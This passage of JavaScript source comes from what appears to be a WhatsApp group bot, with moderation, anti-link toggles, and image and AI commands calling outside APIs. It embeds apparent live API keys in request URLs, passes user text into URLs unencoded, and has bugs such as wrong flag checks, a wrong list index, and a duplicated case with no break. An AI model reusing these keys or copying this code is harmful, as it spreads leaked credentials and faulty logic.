if (!AntiLinkYoutubeChannel) return replygcZero('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcZero('Success in turning off youtube channel antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
      case '/antilinkinstagram': case '/antilinkig': case '/antilinkinsta': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcZero('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcZero('Success in turning on instagram antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcZero('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcZero('Success in turning off instagram antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
        case '/antilinkfacebook': case '/antilinkfb': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcZero('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcZero('Success in turning on facebook antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcZero('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcZero('Success in turning off facebook antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case '/antilinktelegram': case '/antilinktg': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcZero('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcZero('Success in turning on telegram antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcZero('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcZero('Success in turning off telegram antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case '/antilinktiktok': case '/antilinktt': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcZero('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcZero('Success in turning on tiktok antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcZero('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcZero('Success in turning off tiktok antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case '/antilinktwt': case '/antilinktwitter': case '/antilinktwit': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcZero('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcZero('Success in turning on twitter antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcZero('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcZero('Success in turning off twitter antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case '/antilinkall': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcZero('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcZero('Success in turning on all antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcZero('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcZero('Success in turning off all antilink in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case '/antitoxic': case '/antibadword': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (antiToxic) return replygcZero('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcZero('Success in turning on antitoxic in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcZero('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcZero('Success in turning off antitoxic in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case '/antiwame': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (antiWame) return replygcZero('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcZero('Success in turning on antiwame in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcZero('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcZero('Success in turning off antiwame in this group')
} else {
  await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case '/antilinkgc': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (args[0] === "on") {
if (Antilinkgc) return replygcZero('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcZero('Success in turning on antiwame in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcZero('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcZero('Success in turning off antiwame in this group')
} else {
await replygcZero(`Please Type The Option\n\nExample: ${prefixo + command} on\nExample: ${prefixo + command} off\n\non to enable\noff to disable`)
  }
  }
  break
   case '/leavegc': {
                if (!ZeroTheCreator) return ZeroStickOwner()
                await client.groupLeave(m.chat)
                await replygcZero(`Done`)
            }
            break
case '/add': {
if (!m.isGroup) return ZeroStickGroup()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!ZeroTheCreator) return ZeroStickOwner()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'add')
await replygcZero(`Done`)
}
break
case '/closetime': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcZero('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcZero(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
client.groupSettingUpdate(from, 'announcement')
replygcZero(close)
}, timer)
}
break
           case '/ephemeral': {
                if (!m.isGroup) return ZeroStickGroup()
                if (!isBotAdmins) return ZeroStickBotAdmin()
                if (!isAdmins) return ZeroStickAdmin()
                if (!text) return replygcZero('Enter the value enable/disable')
                if (args[0] === 'enable') {
                    await client.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                } else if (args[0] === 'disable') {
                    await client.sendMessage(from, { disappearingMessagesInChat: false })
                    await replygcZero(`Done`)
                }
            }
            break
            
            case '/delete': case '/del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcZero('The message was not sent by a bot!')
                 client.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case '/linkgroup': case '/linkgc': case '/gclink': case '/grouplink': {
                if (!m.isGroup) return ZeroStickGroup()
                if (!isBotAdmins) return ZeroStickBotAdmin()
                let response = await client.groupInviteCode(m.chat)
                client.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case '/opentime': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcZero('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcZero(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
client.groupSettingUpdate(from, 'not_announcement')
replygcZero(open)
}, timer)
}
break
case '/kick': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'remove')
await replygcZero(`Done`)
}
break
case '/setbotname':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (!text) return replygcZero(`Where is the name?\nExample: ${prefixo + command} Zero`)
    await client.updateProfileName(text)
    replygcZero(`Success in changing the name of bot's number`)
    }
    break
case '/setbotbio':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (!text) return replygcZero(`Where is the text?\nExample: ${prefixo + command} Zero`)
    await client.updateProfileStatus(text)
    replygcZero(`Success in changing the bio of bot's number`)
    }
    break
    case '/setgroupname': case '/setsubject': {
                if (!m.isGroup) return ZeroStickGroup()
                if (!isBotAdmins) return ZeroStickBotAdmin()
                if (!isAdmins) return ZeroStickAdmin()
                if (!text) return replygcZero('Text ?')
                await client.groupUpdateSubject(m.chat, text)
                await replygcZero(`Done`)
            }
            break
          case '/setdesc': case '/setdesk': {
                if (!m.isGroup) return ZeroStickGroup()
                if (!isBotAdmins) return ZeroStickBotAdmin()
                if (!isAdmins) return ZeroStickAdmin()
                if (!text) return replygcZero('Text ?')
                await client.groupUpdateDescription(m.chat, text)
                await replygcZero(`Done`)
            }
            break
case '/setppgroup': case '/setgcpp': case '/setgrouppp': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
if (!quoted) return replygcZero(`Where is the picture?`)
if (!/image/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
if (/webp/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
var mediz = await client.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await client.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcZero(`Success`)
} else {
var memeg = await client.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcZero(`Success`)
}
}
break
case '/deleteppgroup': case '/delppgc': case '/deleteppgc': case '/delppgroup': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
    await client.removeProfilePicture(from)
    }
    break
case '/deleteppbot': case '/delppbot': {
if (!ZeroTheCreator) return ZeroStickOwner()
    await client.removeProfilePicture(client.user.id)
    replygcZero(`Success in deleting bot's profile picture`)
    }
    break
case '/promote': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'promote')
await replygcZero(`Done`)
}
break
case '/demote': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await client.groupParticipantsUpdate(m.chat, [users], 'demote')
await replygcZero(`Done`)
}
break
case '/hidetag': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
client.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case '/totag': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
               if (!m.quoted) return replygcZero(`Reply message with caption ${prefixo + command}`)
               client.sendMessage(from, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case '/tagall': {
if (!m.isGroup) return ZeroStickGroup()
if (!isAdmins && !ZeroTheCreator) return ZeroStickAdmin()
if (!isBotAdmins) return ZeroStickBotAdmin()
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
client.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case '/ebinary': {
if (!q) return replygcZero(`Send/reply text with captions ${prefixo + command}`)
ZeroStickWait()
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcZero(eb)
}
break
case '/dbinary': {
if (!q) return replygcZero(`Send/reply text with captions ${prefixo + command}`)
ZeroStickWait()
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcZero(db)
}
break
case '/remini': {
			if (!quoted) return replygcZero(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcZero(`Send/Reply Photos With Captions ${prefixo + command}`)
			ZeroStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			client.sendMessage(from, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
            case '/hi':{
                let pushName = m.pushName || "NO name";
                if(m.quoted){
                    const nme= await client.username(m.quoted.sender)
                    console.log(nme)
                    await client.sendMessage(m.from,{text:`Hello ${nme}`},{quoted:m})
        
                }else{
                await client.sendMessage(from,{text:`Hello ${pushName}`},{quoted:m})
                }
            }
            break
case '/chatgpt':{
    if (!text) return m.reply ('*Please provide a query*')          
let tioress22 = await fetch(`https://api.itsrose.life/chatGPT/completions?prompt=${text}&apikey=Rs-edgarsan`)
let hasill22 = await tioress22.json()
client.sendMessage(from, { text: `${hasill22.message}`.trim() }, { quoted: m });
}
break	
case '/prompt':{
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
    await m.reply("wait")
    let data = await client.downloadAndSaveMediaMessage(quoted)
    let image = await TelegraPh(data)
   let waifu = await fetch(`https://api.itsrose.life/image/stable/prompter?url=${image}&apikey=Rs-edgarsan`)
   let kalu = await waifu.json()
   client.sendMessage(from, { text: `${kalu.result.prompt}`}, { quoted: m });
}
break
case '/dalle':{
    if (!text) return m.reply ('*Please provide a query*')
    await m.reply("wait")
    let wife = `https://api.lolhuman.xyz/api/dall-e?apikey=SGWN&text=${text}`;
    client.sendMessage(
          m.chat,
          { image: { url: wife } },
          {
            quoted: m,
          }
        );
}		
break
case '/stablediff':{
    if (!text) return m.reply ('*Please provide a query*')
    await m.reply("wait")
    let wife = `https://api.itsrose.life/image/stable/diffusion?prompt=${text}&negative_prompt=nsfw%2C%203d%2C%20bad%20anatomy.&ratio=1%3A1&cfg=7.5&model_id=midjourney&seed=&apikey=Rs-edgarsan`
    client.sendMessage(from, { image: {url:wife}}, { quoted: m });
    }
    break

case '/dehaze':{
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
    await m.reply("wait")
    let data = await client.downloadAndSaveMediaMessage(quoted)
    let image = await TelegraPh(data)
		let urlPath =`${image}`
		let methods = "dehaze";
       processing(urlPath, methods).then((buffer) => {
		const bufer = Buffer.from(buffer , 'base64')
        client.sendMessage(
            m.chat,
            { image: bufer },
            {
              quoted: m,
            }
          );})}
break
case '/enhance':{
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
    await m.reply("wait")
    let data = await client.downloadAndSaveMediaMessage(quoted)
    let image = await TelegraPh(data)
		let urlPath =`${image}`
		let methods = "enhance";
       processing(urlPath, methods).then((buffer) => {
		const bufer = Buffer.from(buffer , 'base64')
        client.sendMessage(
            m.chat,
            { image: bufer },
            {
              quoted: m,
            }
            );});
}
break
case '/recolor':{
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
    await m.reply("wait")
    let data = await client.downloadAndSaveMediaMessage(quoted)
    let image = await TelegraPh(data)
		let urlPath =`${image}`
		let methods = "recolor";
       processing(urlPath, methods).then((buffer) => {
		const bufer = Buffer.from(buffer , 'base64')
        client.sendMessage(
            m.chat,
            { image: bufer },
            {
              quoted: m,
            }
            );});
}
break
case'/waifudiff':{
    if (!text) {
		return m.reply(`Example: *${
		prefixo + command
	}* 1girl, solo, ponytail, blush.`);
	}
	m.reply("Progress...");
	const q = m.quoted ? m.quoted : m;

        let some = await fetch(`https://api.itsrose.life/image/anime/diffusion?prompt=${text}&negative_prompt=lowres%2C%20bad%20anatomy%2C%20text%2C%20error%2C%20missing%20fingers%2C%20extra%20digit%2C%20fewer%20digits%2C%20cropped%2C%20worst%20quality%2C%20low%20normal%20jpeg%20artifacts%2C%20signature%2C%20watermark%2C%20username%2C%20blurry%2C%20artist%20name%2C%20bad_prompt_version2%2C%20(((Blurry%20Eyes)))%2C%20(((bad%20anatomy)))%2C%20((disabled%20body))%2C%20((deformed%20((missing%20finger))%2C%20((mutant%20hands))%2C%20((more%20than%20five%20fingers))%2C%20badly%20drawn%20lack%20of%20detail%2C%20(((Low%20resolution)))%2C%20((bad%20((text))%2C%20low-quality%20image%2C%20details%20in%20the%20distorted%20mouth&width=512&height=512&apikey=Rs-edgarsan`)
		let kome = await some.json()
        const urlf = Buffer.from(`${kome.result.images}` , 'base64')
        client.sendMessage(from, { image: Buffer.from(`${kome.result.images}` , 'base64')}, { quoted: m });
}
break

case '/diffme':{
    const q = m.quoted ? m.quoted : m;
	const mime = (q.msg || q).mimetype || q.mediaType || "";
	if (!mime) {
		return m.reply(`Reply/send image with caption ${usedPrefix+command}`);
	}
	if (!/image\/(jpe?g|png)/.test(mime)) {
		return m.reply(`File not support!`);
	}
	m.reply("Progress");
	const imgBuffer = await q.download();
	const form = new FormData();
	const blob = new Blob([imgBuffer], { type: "image/jpg" });
	form.append("file", blob, "image.jpg");

	const style = "anime";
	const { data } = await axios
		.request({
			baseURL: "https://api.itsrose.site", // "https://api.itsrose.site"
			url: "/image/differentMe",
			method: "POST",
			params: {
				style,
				json: true,
				apikey: "Rs-edgarsan",
			},
			data: form,
		})
		.catch((e) => e?.response);
	const { status, result, message } = data;
	if (!status) {
		return m.reply(message);
	}
	await client.sendMessage(
		m.chat,
		{
			image: Buffer.from(result["base64Image"], "base64"),
			caption: `Style: ${style}`,
		},
		{ quoted: m }
	);}
break
case '/toanime':{
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ""
    if (!/image/g.test(mime)) m.reply(`Reply/Send Image With Command${prefixo + command}!`)
    await m.reply("wait")
    let data = await client.downloadAndSaveMediaMessage(quoted)
    let image = await TelegraPh(data)
    let anime
        let wife = `https://api.caliph.biz.id/api/animeai?img=${image}&apikey=caliphkey`
        client.sendMessage(
            m.chat,
            { image: { url: wife } },
            {
              quoted: m,
            }
          );}
break
case '/define':{
    if (!text)  return m.reply(`*Please provide an element name*`) 
        bro = await axios.get(`https://api.popcat.xyz/periodic-table?element=${text}`)
        let lol = "";
		lol += `🔴 *Elelment:* ${bro.data.name}\n`;
		lol += `⬜ *Atomic Number:* ${bro.data.atomic_number}\n`;
		lol += `🟡 *Atomic Mass:* ${bro.data.atomic_mass}\n`;
		lol += `⬛ *Symbol:* ${bro.data.symbol}\n`;
		lol += `*📖 summary:* ${bro.data.summary}\n`;
        await client.sendMessage(from,{image:{url:bro.data.image},caption:lol},{quoted:m}) 
}
break
case '/gimage': {
                if (!text) return replygcZero(`Example : ${prefixo + command} carry minati`)
                ZeroStickWait()
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    client.sendMessage(from, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                })
            }
            case '/gimage': {

       if (!text) return replygcZero(`Example : ${prefixo + command} kaori cicak`
)
        Zeroezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)

        n = Zeroezyanu.result

        images = n[Math.floor(Math.random() * n.length)]


                client.sendMessage(from, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
        }

        break
			case '/mediafire': {
	if (args.length == 0) return replygcZero(`Where is the link ?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcZero(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return replygcZero('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replygcZero(`${result4}`)
client.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case '/tiktokxx':{ 
if (!text) return replygcZero( `Example : ${prefixo + command} link`)
if (!q.includes('tiktok')) return replygcZero(`Link Invalid!!`)
ZeroStickWait()
require('./lib/tiktok').Tiktok(q).then( data => {
client.sendMessage(from, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case '/tiktokaudioxx':{
if (!text) return replygcZero( `Example : ${prefixo + command} link`)
if (!q.includes('tiktok')) return replygcZero(`Link Invalid!!`)
ZeroStickWait()
require('./lib/tiktok').Tiktok(q).then( data => {
client.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case '/google': {
if (!q) return replygcZero(`Example : ${prefixo + command} ${botname}`)
ZeroStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcZero(teks)
})
}
break
case '/happymod':{
if (!q) return replygcZero(`Example ${prefixo+command} Sufway surfer mod`)
ZeroStickWait()
let kat = await scp1.happymod(q)
replygcZero(util.format(kat))
}
break
case '/search':
case '/yts': case '/ytsearch': {
                if (!text) return replygcZero(`Example : ${prefixo + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
